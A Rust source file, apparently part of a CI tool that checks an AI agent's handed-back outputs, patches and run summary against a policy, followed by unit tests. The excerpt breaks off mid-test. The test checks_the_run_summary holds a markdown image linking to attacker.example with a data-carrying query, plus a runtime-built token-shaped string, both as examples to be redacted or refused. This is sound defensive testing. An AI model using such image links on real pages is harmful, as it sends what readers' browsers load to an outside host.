//! `agentic-job check`: check handed-back outputs and the patch against
//! the policy. Step 4 of docs/plan.md.
//!
//! This is the second half of the check. The first is the collector,
//! `agentic-job collect`, gh-aw's (`collect_ndjson_output.cjs`) ported,
//! which knows the request types, counts them, and validates and
//! sanitizes their fields; it is run before this, configured with the
//! policy's `safe_outputs`, and its result is given here with
//! `--collected`. Nothing of it is done again. What is done here is what
//! gh-aw leaves to the workflow it generates, or does not do at all, and
//! most of it is the safe-outputs library's ([`safe_outputs::check`]): the
//! requests fit the policy; a pull request comes with exactly its patch,
//! against the policy's repository and base; and the patch passes the
//! rules of [`read_patch`]. This is the run's side of it: the hand-back
//! holds only the files it may, within their sizes, read without
//! following a link, and free of private keys (other secret-shaped
//! strings are warnings: see [`redact`]); its memory and checkpoint
//! ([`memory`], [`checkpoint`]); and the report.

pub mod base;
pub mod checkpoint;
pub mod memory;

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use serde::Serialize;
use serde_json::{Map, Value};

use crate::exit::Exit;
use crate::files;
use crate::policy::{Forge, Load, MISSING_DATA, NOOP, PUSH_TO_PULL_REQUEST_BRANCH, Policy};
use crate::redact;
use crate::run::public_addresses::PublicAddresses;
use safe_outputs::check::inline::CheckedTarget;
use safe_outputs::check::{Collected, Publishers, Trusted};

pub use safe_outputs::check::{
    BASE_COMMIT_HEADER, BASE_FILE, PatchInfo, PatchReading, RUN_BRANCH_PREFIX, SECONDARY_BASE_FILE,
    handler_limits, is_patch_file_name, is_run_branch, item_type, links, map_holds_marker,
    patch_file_name, patch_file_name_in, read_patch, replacement, secondary_target,
};
#[cfg(test)]
use safe_outputs::check::{CREATE_ISSUE, ISSUE_LINKS, target_key};
pub use safe_outputs::{MAX_OUTPUTS_BYTES, OUTPUTS_FILE};

const MAX_BASE_BYTES: u64 = 4096;
/// How much of a `memory.json` is read where the policy allows none: it
/// is refused whatever it holds, but read with a bound like the rest.
const MAX_UNEXPECTED_MEMORY_BYTES: u64 = 4096;

/// The collector's result is the requests again, sanitized, as one JSON
/// value: a little more than the requests themselves.
const MAX_COLLECTED_BYTES: u64 = 4 * MAX_OUTPUTS_BYTES;

/// How much of a request's title, or of a reason, one line of the summary
/// or of the log shows.
const SHOWN_CHARS: usize = 300;

/// How much of a commit id the summary shows.
const SHORT_COMMIT: usize = 12;

#[derive(Debug, clap::Args)]
pub struct Args {
    /// The policy.json that `policy` printed for this run
    #[arg(long, value_name = "FILE")]
    pub policy: PathBuf,
    /// The directory holding the handed-back outputs
    #[arg(long, value_name = "DIR")]
    pub outputs: PathBuf,
    /// What gh-aw's collector made of the outputs (its agent_output.json)
    #[arg(long, value_name = "FILE")]
    pub collected: PathBuf,
    /// Where to write the verdict, with the reasons for a refusal, as JSON
    #[arg(long, value_name = "FILE")]
    pub report: Option<PathBuf>,
    /// Fixed repository for comments, supplied by the trusted caller
    #[arg(long, requires = "comment_target", value_name = "OWNER/REPO")]
    pub comment_repo: Option<String>,
    /// Fixed issue or pull request number for comments
    #[arg(long, requires = "comment_repo", value_name = "NUMBER", value_parser = clap::value_parser!(u64).range(1..))]
    pub comment_target: Option<u64>,
    /// Admitted PR/MR head for neutral inline comments; never read from agent output
    #[arg(long, requires = "comment_target", value_name = "SHA")]
    pub review_head: Option<String>,
    /// The identifier `run` was given (`--meta`'s `run_id`): the only run
    /// whose branch a secondary pull request may be on
    #[arg(long, value_name = "ID")]
    pub run_id: Option<String>,
    /// Trusted pre-agent public-base evidence, never a file from --outputs
    #[arg(long, value_name = "FILE")]
    pub base_secret_evidence: Option<PathBuf>,
    /// `run`'s summary.md, checked into the report for apply to post
    #[arg(long, value_name = "FILE")]
    pub run_summary: Option<PathBuf>,
}

/// The most of a run summary [`checked_run_summary`] keeps, in UTF-16
/// units: below GitLab's 1,000,000-character note, with room for apply's
/// footer and its breaking of mentions.
const MAX_RUN_SUMMARY_UNITS: usize = 900_000;

/// `run`'s summary.md at PATH as apply may post it: read without
/// following a link, at most the size `run` writes it to for GitHub's job
/// summary, and sanitized as the collector sanitizes a comment's body, so
/// that a link the policy does not keep is redacted (an image URL would
/// otherwise send what the agent read to its host from every reader's
/// browser). One shaped like a credential, which `run` should have
/// redacted, is refused.
fn checked_run_summary(path: &Path, policy: &Policy) -> Result<String> {
    let bytes = files::read_regular(path, crate::run::SUMMARY_BYTES as u64)
        .map_err(|err| anyhow::anyhow!("{err}"))?;
    anyhow::ensure!(
        !redact::is_secret_shaped(&bytes),
        "it holds a string shaped like a credential"
    );
    let markdown = String::from_utf8(bytes).context("it is not UTF-8")?;
    Ok(safe_outputs::collect::sanitize::sanitize(
        &markdown,
        MAX_RUN_SUMMARY_UNITS,
        false,
        &|host| policy.keeps_link_to(host),
    ))
}

/// What `check` decided. `--report` holds this as JSON.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct Verdict {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub inline_target: Option<CheckedTarget>,
    pub ok: bool,
    /// Every reason for a refusal.
    pub errors: Vec<String>,
    /// The requests, as the collector sanitized them.
    pub items: Vec<Map<String, Value>>,
    pub patch: Option<PatchInfo>,
    /// The patch of the policy's secondary pull request, in its own
    /// repository: apply applies it there, and only there.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub secondary_patch: Option<PatchInfo>,
    /// Where the policy has complete work opened ready, the checkpoint the
    /// pull request or push says the work stopped at: apply keeps it a draft.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub checkpoint: Option<checkpoint::Checkpoint>,
    /// Where the hand-back holds a string shaped like a credential, by
    /// file, line and pattern: not a refusal, since the run holds none but
    /// its own, which `run` refuses before anything is uploaded.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub warnings: Vec<String>,
    /// What an accepted `memory.json` holds, in counts.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub memory: Option<memory::MemoryInfo>,
    /// The run is blocked, not failed: see [`Verdict::is_blocked`]. Apply
    /// reports it so and succeeds.
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub blocked: bool,
    /// `run`'s summary.md from `--run-summary`, sanitized as a request's
    /// text is, for apply to post where the forge has no job summary.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub run_summary: Option<String>,
}

impl Verdict {
    fn new(
        mut errors: Vec<String>,
        items: Vec<Map<String, Value>>,
        patch: Option<PatchInfo>,
    ) -> Self {
        // Each once, in the order found.
        let mut seen = BTreeSet::new();
        errors.retain(|error| seen.insert(error.clone()));
        Self {
            inline_target: None,
            ok: errors.is_empty(),
            errors,
            items,
            patch,
            secondary_patch: None,
            checkpoint: None,
            warnings: Vec::new(),
            memory: None,
            blocked: false,
            run_summary: None,
        }
    }

    /// Whether the run handed back that it is blocked, and nothing else:
    /// at least one `missing_data`, at most `noop`s beside it, and no
    /// patch or memory. Such a run did what it could (a prerequisite is
    /// not merged yet, a decision is needed, the work is in another
    /// repository), and showing it as a failure hides real ones. Anything
    /// more, a `missing_tool` included, keeps the run's outcome as it was.
    fn is_blocked(&self) -> bool {
        self.ok
            && self.patch.is_none()
            && self.secondary_patch.is_none()
            && self.memory.is_none()
            && self
                .items
                .iter()
                .any(|item| item_type(item) == MISSING_DATA)
            && self
                .items
                .iter()
                .all(|item| [MISSING_DATA, NOOP].contains(&item_type(item)))
    }

    /// A Markdown summary, for a job's summary page.
    pub fn markdown(&self, policy: &Policy) -> String {
        let mut lines = vec![
            format!(
                "### Safe outputs: {}",
                if self.ok { "accepted" } else { "refused" }
            ),
            String::new(),
            format!(
                "Policy: {} @ {}, outputs {}, at most {}.",
                policy.repo,
                policy.base,
                policy.safe_outputs.types().collect::<Vec<_>>().join(", "),
                policy.max_outputs
            ),
            String::new(),
        ];
        lines.extend(self.items.iter().map(|item| {
            let text = ["title", "message"]
                .iter()
                .find_map(|key| item.get(*key).and_then(Value::as_str))
                .filter(|text| !text.is_empty());
            match text {
                Some(text) => format!("- `{}`: {}", item_type(item), one_line(text)),
                None => format!("- `{}`", item_type(item)),
            }
        }));
        if self.items.is_empty() {
            lines.push("- no outputs".to_owned());
        }
        if self.blocked {
            lines.push(
                "- blocked: the run handed back missing_data and nothing to apply".to_owned(),
            );
        }
        if let Some(patch) = &self.patch {
            let commit: String = patch.base_commit.chars().take(SHORT_COMMIT).collect();
            lines.push(format!(
                "- patch `{}` ({} bytes) against {commit}",
                patch.file, patch.bytes
            ));
        }
        if let (Some(patch), Some(target)) = (&self.secondary_patch, &policy.secondary_pull_request)
        {
            let commit: String = patch.base_commit.chars().take(SHORT_COMMIT).collect();
            lines.push(format!(
                "- patch `{}` ({} bytes) against {} @ {commit}",
                patch.file, patch.bytes, target.repo
            ));
        }
        if let Some(memory) = &self.memory {
            lines.push(format!(
                "- memory: {} file(s), {} bytes",
                memory.files, memory.bytes
            ));
        }
        lines.extend(
            self.errors
                .iter()
                .map(|error| format!("- refused: {}", one_line(error))),
        );
        lines.extend(
            self.warnings
                .iter()
                .map(|warning| format!("- warning: a secret-shaped string in {warning}")),
        );
        lines.join("\n") + "\n"
    }
}

/// `text` as one line of bounded length. The requests and the reasons
/// quote what the agent wrote, and a line of the agent's own in a job's
/// log could be read as a command to the CI system.
fn one_line(text: &str) -> String {
    text.chars()
        .take(SHOWN_CHARS)
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect()
}

/// apply's own publishers, whose refusals check makes before the session
/// ends rather than after it: neutral inline comments, and the types the
/// bounds route to `agentic-job publish`.
pub(crate) struct Apply;

impl Publishers for Apply {
    fn inline_comment(&self, item: &Map<String, Value>, forge: Forge) -> Result<()> {
        crate::apply::inline::fields(item, forge)
    }

    fn native_refusals(&self, items: &[Value], routed: &[String]) -> Vec<String> {
        crate::apply::publish::refusals(items, routed)
    }
}

/// The fields of a request that would take it out of the policy
/// ([`safe_outputs::check::redirections_to`]), with apply's publishers.
#[cfg(test)]
fn redirections(item: &Map<String, Value>, policy: &Policy) -> Vec<String> {
    redirections_to(item, policy, None)
}

#[cfg(test)]
fn redirections_to(
    item: &Map<String, Value>,
    policy: &Policy,
    comment: Option<(&str, u64)>,
) -> Vec<String> {
    safe_outputs::check::redirections_to(item, policy, comment, &Apply)
}

fn is_handback_file(name: &str) -> bool {
    name == OUTPUTS_FILE
        || name == BASE_FILE
        || name == SECONDARY_BASE_FILE
        || name == replacement::REPLACEMENT_FILE
        || name == memory::MEMORY_FILE
        || is_patch_file_name(name)
}

/// The most a file of a hand-back may hold. Which patch is which is
/// known only from the requests, so each is read within the larger
/// budget and held to its own once it is.
fn max_bytes_of(name: &str, policy: &Policy) -> u64 {
    match name {
        OUTPUTS_FILE => MAX_OUTPUTS_BYTES,
        BASE_FILE | SECONDARY_BASE_FILE => MAX_BASE_BYTES,
        memory::MEMORY_FILE => policy
            .memory
            .as_ref()
            .map_or(MAX_UNEXPECTED_MEMORY_BYTES, memory::max_json_bytes),
        replacement::REPLACEMENT_FILE => policy.max_patch_bytes,
        _ => policy
            .secondary_pull_request
            .as_ref()
            .map_or(policy.max_patch_bytes, |target| {
                target.max_patch_bytes.max(policy.max_patch_bytes)
            }),
    }
}

/// Checks the hand-back in `dir` (`outputs.jsonl`, `base.json`, one
/// `aw-*.patch` or `replacement.json`, `memory.json`) and the collector's result for it against `policy`.
///
/// An error is something wrong with the check's own inputs, the
/// directory or the collector's result; whatever is wrong with the
/// hand-back is a refusal, in the verdict.
pub fn check_outputs(dir: &Path, collected: &Path, policy: &Policy) -> Result<Verdict> {
    check_outputs_to(dir, collected, policy, None, None)
}

/// The same, for the run RUN_ID, the only one whose branch a secondary
/// pull request may be on.
pub fn check_run_outputs(
    dir: &Path,
    collected: &Path,
    policy: &Policy,
    run_id: &str,
) -> Result<Verdict> {
    check_outputs_to(dir, collected, policy, None, Some(run_id))
}

fn check_outputs_to(
    dir: &Path,
    collected: &Path,
    policy: &Policy,
    comment: Option<(&str, u64)>,
    run_id: Option<&str>,
) -> Result<Verdict> {
    check_outputs_with_public(
        dir,
        collected,
        policy,
        comment,
        run_id,
        &PublicAddresses::default(),
    )
}

pub(crate) fn check_run_outputs_with_public(
    dir: &Path,
    collected: &Path,
    policy: &Policy,
    run_id: &str,
    public: &PublicAddresses,
) -> Result<Verdict> {
    check_outputs_with_public(dir, collected, policy, None, Some(run_id), public)
}

fn check_outputs_with_public(
    dir: &Path,
    collected: &Path,
    policy: &Policy,
    comment: Option<(&str, u64)>,
    run_id: Option<&str>,
    public: &PublicAddresses,
) -> Result<Verdict> {
    let mut verdict = verdict_of(dir, collected, policy, comment, run_id, public)?;
    verdict.blocked = verdict.is_blocked();
    Ok(verdict)
}

fn verdict_of(
    dir: &Path,
    collected: &Path,
    policy: &Policy,
    comment: Option<(&str, u64)>,
    run_id: Option<&str>,
    public: &PublicAddresses,
) -> Result<Verdict> {
    let mut errors = Vec::new();
    let mut names = std::fs::read_dir(dir)
        .and_then(|entries| {
            entries
                .map(|entry| entry.map(|e| e.file_name()))
                .collect::<Result<Vec<_>, _>>()
        })
        .with_context(|| format!("reading the outputs directory {}", dir.display()))?;
    names.sort();

    let mut contents: BTreeMap<String, Vec<u8>> = BTreeMap::new();
    let mut warnings = Vec::new();
    for name in &names {
        let Some(name) = name.to_str().filter(|name| is_handback_file(name)) else {
            errors.push(format!("unexpected file {name:?}"));
            continue;
        };
        match files::read_regular(&dir.join(name), max_bytes_of(name, policy)) {
            Ok(content) => {
                let allowed = if !policy.private && is_patch_file_name(name) {
                    std::str::from_utf8(&content)
                        .map(|text| public.allowed_secret_lines(name, text))
                        .unwrap_or_default()
                } else {
                    BTreeSet::new()
                };
                let mut refused = false;
                for (index, line) in content.split(|&b| b == b'\n').enumerate() {
                    if redact::is_private_key(line) {
                        if allowed.contains(&(index + 1)) {
                            eprintln!(
                                "{name}, line {}: base already contains this; allowed",
                                index + 1
                            );
                            warnings.push(format!(
                                "{name}, line {}: base already contains this; allowed",
                                index + 1
                            ));
                        } else {
                            refused = true;
                        }
                    }
                }
                if refused {
                    errors.push(format!("a secret-shaped string in {name}: a private key"));
                    continue;
                }
                let shaped = redact::shaped_lines(&content[..])
                    .with_context(|| format!("searching {name}"))?;
                warnings.extend(
                    shaped
                        .into_iter()
                        .map(|(line, pattern)| format!("{name}, line {line}: matches `{pattern}`")),
                );
                contents.insert(name.to_owned(), content);
            }
            Err(err) => errors.push(format!("{name} {err}")),
        }
    }
    warnings.truncate(redact::MAX_SHAPE_WARNINGS);
    // Taken from a path of its own and never from `dir`, which the agent's
    // machine uploaded: a result found there could be the agent's.
    let collected_bytes = files::read_regular(collected, MAX_COLLECTED_BYTES)
        .with_context(|| format!("the collector's result {}", collected.display()))?;
    if redact::is_private_key(&collected_bytes) {
        errors.push("a secret-shaped string in the collected outputs: a private key".to_owned());
    }
    if !errors.is_empty() {
        return Ok(Verdict {
            warnings,
            ..Verdict::new(errors, Vec::new(), None)
        });
    }

    let collected: Collected = serde_json::from_slice(&collected_bytes).with_context(|| {
        format!(
            "{} is not the result of gh-aw's collector",
            collected.display()
        )
    })?;
    let handback = safe_outputs::check::Handback {
        outputs: contents.get(OUTPUTS_FILE).map(Vec::as_slice),
        base: contents.get(BASE_FILE).map(Vec::as_slice),
        secondary_base: contents.get(SECONDARY_BASE_FILE).map(Vec::as_slice),
        replacement: contents
            .get(replacement::REPLACEMENT_FILE)
            .map(Vec::as_slice),
        patches: contents
            .iter()
            .filter(|(name, _)| is_patch_file_name(name))
            .map(|(name, content)| (name.as_str(), content.as_slice()))
            .collect(),
    };
    // The run's own checks, where the library's order puts them: before
    // a replacement's, so that memory goes with either.
    let mut checkpoint = None;
    let mut memory = None;
    let lifecycle = |request: Option<&Map<String, Value>>| {
        let mut errors = Vec::new();
        // Read only where it decides something: a policy without
        // `ready_when_complete` opens every pull request as a draft anyway.
        if let Some(item) = request.filter(|_| policy.safe_outputs.ready_when_complete()) {
            let output = item_type(item);
            let key = if output == PUSH_TO_PULL_REQUEST_BRANCH {
                "message"
            } else {
                "body"
            };
            match checkpoint::find(item.get(key).and_then(Value::as_str).unwrap_or_default()) {
                Ok(found) => checkpoint = found,
                Err(err) => errors.push(format!("the {output}'s {key}: {err:#}")),
            }
        }
        if let Some(content) = contents.get(memory::MEMORY_FILE) {
            match &policy.memory {
                None => errors.push(format!("{} without a [memory] bound", memory::MEMORY_FILE)),
                Some(rules) => match memory::check(content, rules) {
                    Ok(info) => memory = Some(info),
                    Err(error) => errors.push(format!("memory: {error:#}")),
                },
            }
        }
        errors
    };
    let trusted = Trusted { comment, run_id };
    let checked =
        safe_outputs::check::check(&handback, collected, policy, trusted, &Apply, lifecycle);
    Ok(Verdict {
        secondary_patch: checked.secondary_patch,
        checkpoint,
        warnings,
        memory,
        ..Verdict::new(checked.errors, checked.items, checked.patch)
    })
}

pub fn run(args: &Args) -> Result<Exit> {
    let policy = Policy::load(&args.policy)?;
    let comment = args.comment_repo.as_deref().zip(args.comment_target);
    let public = args
        .base_secret_evidence
        .as_deref()
        .map(|path| {
            let bytes = files::read_regular(path, 1 << 20)
                .map_err(|err| anyhow::anyhow!("base secret evidence {err}"))?;
            serde_json::from_slice::<PublicAddresses>(&bytes)
                .context("reading trusted base secret evidence")
        })
        .transpose()?
        .unwrap_or_default();
    let mut verdict = check_outputs_with_public(
        &args.outputs,
        &args.collected,
        &policy,
        comment,
        args.run_id.as_deref(),
        &public,
    )?;
    if policy.forge != crate::policy::Forge::Github
        && verdict
            .items
            .iter()
            .any(|item| item_type(item) == crate::policy::CREATE_REVIEW_COMMENT)
    {
        match safe_outputs::check::inline::checked_target(
            comment,
            args.review_head.as_deref(),
            &policy,
        ) {
            Ok(target) => verdict.inline_target = Some(target),
            Err(err) => {
                verdict.errors.push(format!("{err:#}"));
                verdict.ok = false;
            }
        }
    }
    // An extra: one that fails its checks is left out, and the run's
    // requests are decided without it.
    if let Some(path) = &args.run_summary {
        match checked_run_summary(path, &policy) {
            Ok(summary) => verdict.run_summary = Some(summary),
            Err(err) => eprintln!(
                "warning: the run summary {} is left out: {err:#}",
                path.display()
            ),
        }
    }
    if let Some(report) = &args.report {
        let json = serde_json::to_string_pretty(&verdict).context("writing the verdict")?;
        std::fs::write(report, json + "\n")
            .with_context(|| format!("writing the report {}", report.display()))?;
    }
    for error in &verdict.errors {
        eprintln!("error: {}", one_line(error));
    }
    for warning in &verdict.warnings {
        eprintln!("warning: a secret-shaped string in {warning}");
    }
    print!("{}", verdict.markdown(&policy));
    Ok(if verdict.ok {
        Exit::Success
    } else {
        Exit::Failure
    })
}

#[cfg(test)]
mod tests {
    use std::os::unix::fs::symlink;

    use serde_json::json;

    use super::*;
    use crate::policy::tests::policy;
    use crate::policy::{
        Forge, HIDE_COMMENT, MARK_READY, REVIEW_THREAD_OUTPUTS, Secondary, update_fields,
    };

    const BASE: &str = "1111111111111111111111111111111111111111";
    const RUN_ID: &str = "7";
    const BRANCH: &str = "agent-run-7";
    const PATCH_NAME: &str = "aw-agent-run-7.patch";

    #[test]
    fn fixed_comment_destination() {
        let policy = policy();
        for (fields, accepted) in [
            (json!({}), true),
            (json!({"repo": "TRACKER/ITEMS", "item_number": 64}), true),
            (json!({"repo": "tracker/items", "pr_number": "64"}), true),
            (json!({"repo": "bootc-dev/bootc"}), false),
            (json!({"item_number": 65}), false),
            (json!({"pr": 65}), false),
            (json!({"pr_number": 65}), false),
            (json!({"item_number": "aw_other"}), false),
            (json!({"item_number": null}), false),
            (json!({"comment_id": 64}), false),
            (json!({"reply_to_id": "other"}), false),
            (json!({"target": "status"}), false),
        ] {
            let mut item = fields.as_object().unwrap().clone();
            item.insert("type".into(), json!("add_comment"));
            assert_eq!(
                redirections_to(&item, &policy, Some(("tracker/items", 64))).is_empty(),
                accepted,
                "{fields}"
            );
        }
        let item = json!({"type": "create_pull_request", "repo": "tracker/items"});
        assert!(
            !redirections_to(
                item.as_object().unwrap(),
                &policy,
                Some(("tracker/items", 64))
            )
            .is_empty()
        );
    }

    /// A run summary is sanitized as a comment's body, links to hosts the
    /// policy does not keep redacted; one that is a link, larger than the
    /// job summary, not text or shaped like a credential is left out.
    #[test]
    fn checks_the_run_summary() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("summary.md");
        std::fs::write(
            &path,
            "## Agent run\n\n![x](https://attacker.example/p?d=abc) <!-- hidden -->\n",
        )
        .unwrap();
        let summary = checked_run_summary(&path, &policy()).unwrap();
        assert!(summary.starts_with("## Agent run"), "{summary}");
        assert!(!summary.contains("d=abc"), "{summary}");
        assert!(summary.contains("attacker.example/redacted"), "{summary}");
        assert!(!summary.contains("hidden"), "{summary}");

        // Built here, so that no credential-shaped string is in the source.
        let token = format!("gh{}_{}", "p", "A1b2C3d4".repeat(5));
        let link = dir.path().join("link.md");
        symlink(&path, &link).unwrap();
        let cases: [(&str, &Path, Option<Vec<u8>>); 4] = [
            ("a link", &link, None),
            (
                "too large",
                &path,
                Some(vec![b'x'; crate::run::SUMMARY_BYTES + 1]),
            ),
            ("not text", &path, Some(vec![0xff, b'\n'])),
            ("a credential", &path, Some(format!("t {token}\n").into())),
        ];
        for (name, read, content) in cases {
            if let Some(content) = content {
                std::fs::write(&path, content).unwrap();
            }
            assert!(checked_run_summary(read, &policy()).is_err(), "{name}");
        }
    }

    #[test]
    fn item_number_is_refused_where_issues_and_pull_requests_are_numbered_apart() {
        for (forge, fields, accepted) in [
            (Forge::Github, json!({"item_number": 64}), true),
            (Forge::Forgejo, json!({"item_number": 64}), true),
            (Forge::Gitlab, json!({"item_number": 64}), false),
            (Forge::Gitlab, json!({"issue_number": 64}), true),
            (Forge::Gitlab, json!({"pull_request_number": 64}), true),
        ] {
            let policy = Policy { forge, ..policy() };
            let mut item = fields.as_object().unwrap().clone();
            item.insert("type".into(), json!("add_comment"));
            let problems = redirections_to(&item, &policy, Some(("tracker/items", 64)));
            assert_eq!(
                problems.is_empty(),
                accepted,
                "{forge:?} {fields}: {problems:?}"
            );
        }
    }

    /// A label request names one item explicitly: by `item_number` where
    /// issues and pull requests are numbered together, and on GitLab by
    /// exactly one target of its kind.
    #[test]
    fn label_targets_by_forge() {
        let label = |forge, fields: Value| {
            let policy = Policy { forge, ..policy() };
            let mut item = fields.as_object().unwrap().clone();
            item.insert("type".into(), json!("remove_labels"));
            item.insert("repo".into(), json!(policy.repo));
            item.insert("labels".into(), json!(["bug"]));
            redirections_to(&item, &policy, None)
        };
        // The forge, the target fields, and a part of the refusal.
        let cases: &[(Forge, Value, Option<&str>)] = &[
            (Forge::Github, json!({"item_number": 5}), None),
            (Forge::Forgejo, json!({"item_number": 5}), None),
            (
                Forge::Forgejo,
                json!({"issue_number": 5}),
                Some("requires a positive integer item_number"),
            ),
            (Forge::Gitlab, json!({"issue_number": 5}), None),
            (Forge::Gitlab, json!({"pull_request_number": 5}), None),
            (
                Forge::Gitlab,
                json!({"item_number": 5}),
                Some("requires a positive integer issue_number"),
            ),
            (
                Forge::Gitlab,
                json!({"issue_number": 5, "pull_request_number": 5}),
                Some("with unsupported target field pull_request_number"),
            ),
            (
                Forge::Gitlab,
                json!({}),
                Some("requires a positive integer issue_number"),
            ),
            (
                Forge::Gitlab,
                json!({"pull_request_number": "5"}),
                Some("requires a positive integer pull_request_number"),
            ),
        ];
        for (forge, fields, refusal) in cases {
            let problems = label(*forge, fields.clone());
            match refusal {
                None => assert!(problems.is_empty(), "{forge:?} {fields}: {problems:?}"),
                Some(refusal) => assert!(
                    problems.iter().any(|problem| problem.contains(refusal)),
                    "{forge:?} {fields}: {problems:?}"
                ),
            }
        }
    }

    fn patch_of(path: &str) -> String {
        format!(
            "From 2222222222222222222222222222222222222222 Mon Sep 17 00:00:00 2001\n\
             {BASE_COMMIT_HEADER}: {BASE}\n\
             From: agent <agent@localhost>\n\
             Date: Tue, 6 Oct 2026 21:02:35 -0400\n\
             Subject: [PATCH] Change things\n\
             \n\
             ---\n \
             {path} | 1 +\n\
             \n\
             diff --git a/{path} b/{path}\nnew file mode 100644\nindex 0000000..c600332\n\
             --- /dev/null\n+++ b/{path}\n@@ -0,0 +1 @@\n+x\n"
        )
    }

    fn pull_request() -> Value {
        json!({"type": "create_pull_request", "title": "Fix the thing", "body": "Why.", "branch": BRANCH})
    }

    fn noop() -> Value {
        json!({"type": "noop", "message": "Nothing to do."})
    }

    fn missing_tool() -> Value {
        json!({"type": "missing_tool", "tool": "podman", "reason": "Not installed."})
    }

    /// What gh-aw's collector appends to a result without a request.
    fn incomplete() -> Value {
        json!({"type": "report_incomplete", "reason": "missing_terminal_safe_output",
            "failureCause": "missing_terminal_safe_output", "retryCount": 0})
    }

    fn base_json() -> String {
        json!({"repo": "bootc-dev/bootc", "ref": "main", "commit": BASE}).to_string()
    }

    /// A hand-back and the collector's result for it.
    #[derive(Default, Clone)]
    struct Handback {
        /// The collector's items; also written as `outputs.jsonl`.
        items: Vec<Value>,
        /// The collector's errors.
        refused: Vec<&'static str>,
        /// Other files of the hand-back.
        files: Vec<(&'static str, String)>,
        /// Leave `outputs.jsonl` out.
        no_outputs: bool,
        /// Append, to the collector's items only, the incomplete report
        /// it adds of its own.
        incomplete: bool,
        /// Check it without the run's identifier, [`RUN_ID`].
        no_run_id: bool,
    }

    impl Handback {
        fn pull_request() -> Self {
            Self {
                items: vec![pull_request()],
                files: vec![
                    (PATCH_NAME, patch_of("src/new.rs")),
                    (BASE_FILE, base_json()),
                ],
                ..Self::default()
            }
        }

        /// The same with one file replaced, added (or removed, for `None`).
        fn with(mut self, name: &'static str, content: Option<String>) -> Self {
            self.files.retain(|(file, _)| *file != name);
            self.files.extend(content.map(|content| (name, content)));
            self
        }

        fn check(&self) -> Verdict {
            self.check_against(&policy())
        }

        fn check_against(&self, policy: &Policy) -> Verdict {
            let dir = tempfile::tempdir().unwrap();
            let out = dir.path().join("out");
            std::fs::create_dir(&out).unwrap();
            if !self.no_outputs {
                let lines: String = self.items.iter().map(|item| format!("{item}\n")).collect();
                std::fs::write(out.join(OUTPUTS_FILE), lines).unwrap();
            }
            for (name, content) in &self.files {
                std::fs::write(out.join(name), content).unwrap();
            }
            let collected = dir.path().join("agent_output.json");
            let mut items = self.items.clone();
            items.extend(self.incomplete.then(incomplete));
            let result = json!({"items": items, "errors": self.refused});
            std::fs::write(&collected, result.to_string()).unwrap();
            if self.no_run_id {
                check_outputs(&out, &collected, policy).unwrap()
            } else {
                check_run_outputs(&out, &collected, policy, RUN_ID).unwrap()
            }
        }
    }

    const TOOL_PATCH: &str = "aw-o-tool-agentic-job-agent-run-7.patch";

    /// [`policy`], which may also open one pull request in `o/tool`.
    fn secondary_policy() -> Policy {
        Policy {
            secondary_pull_request: Some(Secondary {
                repo: "o/tool".into(),
                clone_url: "https://github.com/o/tool".into(),
                base: "main".into(),
                branch_prefix: "agentic-job/".into(),
                max: 1,
                max_patch_bytes: 2048,
                max_patch_files: 1,
                protected_files: vec!["go.mod".into()],
                protect_top_level_dot_folders: true,
                unprotected_dot_folders: Vec::new(),
                protected_paths: vec!["raw/**".into()],
            }),
            ..policy()
        }
    }

    fn tool_request() -> Value {
        json!({"type": "create_pull_request", "repo": "o/tool", "title": "Fix the tool",
            "body": "Why.", "branch": format!("agentic-job/{BRANCH}")})
    }

    /// The run's own pull request and the secondary one, each with its
    /// patch and base.
    fn both() -> Handback {
        let mut handback = Handback::pull_request()
            .with(TOOL_PATCH, Some(patch_of("tool.rs")))
            .with(
                SECONDARY_BASE_FILE,
                Some(json!({"repo": "o/tool", "ref": "main", "commit": BASE}).to_string()),
            );
        handback.items.push(tool_request());
        handback
    }

    /// The secondary pull request is checked as a destination of its own:
    /// its exact repository, base and draft, its own patch and base file,
    /// count, budgets and protected files; a request for any other
    /// repository, or without the policy's secondary, is refused.
    #[test]
    fn a_secondary_pull_request_is_held_to_its_own_bounds() {
        let policy = secondary_policy();
        let verdict = both().check_against(&policy);
        assert!(verdict.ok, "{:?}", verdict.errors);
        assert_eq!(verdict.patch.unwrap().file, PATCH_NAME);
        let secondary = verdict.secondary_patch.unwrap();
        assert_eq!(
            (secondary.file.as_str(), &secondary.files[..]),
            (TOOL_PATCH, &["tool.rs".to_owned()][..])
        );
        assert!(
            both()
                .check_against(&policy)
                .markdown(&policy)
                .contains(&format!("- patch `{TOOL_PATCH}`")),
        );
        let alone = Handback {
            items: vec![tool_request()],
            ..both().with(PATCH_NAME, None).with(BASE_FILE, None)
        };
        let verdict = alone.check_against(&policy);
        assert!(verdict.ok, "{:?}", verdict.errors);
        assert!(verdict.patch.is_none() && verdict.secondary_patch.is_some());

        let with_item = |fields: Value| {
            let mut handback = both();
            for (key, value) in fields.as_object().unwrap() {
                handback.items[1][key] = value.clone();
            }
            handback
        };
        let big = format!("{}+{}\n", patch_of("tool.rs"), "x".repeat(2048));
        let cases: Vec<(&str, Handback, &Policy, &str)> = vec![
            (
                "its base, missing",
                both().with(SECONDARY_BASE_FILE, None),
                &policy,
                "secondary-base.json is not {repo: o/tool, ref: main, commit: SHA}",
            ),
            (
                "its base, of another branch",
                both().with(
                    SECONDARY_BASE_FILE,
                    Some(json!({"repo": "o/tool", "ref": "dev", "commit": BASE}).to_string()),
                ),
                &policy,
                "secondary-base.json is not",
            ),
            (
                "its base, of the run's repository",
                both().with(SECONDARY_BASE_FILE, Some(base_json())),
                &policy,
                "secondary-base.json is not",
            ),
            (
                "its patch, missing",
                both().with(TOOL_PATCH, None),
                &policy,
                "needs its patch, aw-o-tool-agentic-job-agent-run-7.patch",
            ),
            // A branch that names its patch as anything but the run's
            // under the prefix: the name gh-aw's handler could look for
            // the run's own patch by, in `o/tool-agentic-job`.
            (
                "the run's branch, without the prefix",
                with_item(json!({"branch": BRANCH}))
                    .with(TOOL_PATCH, None)
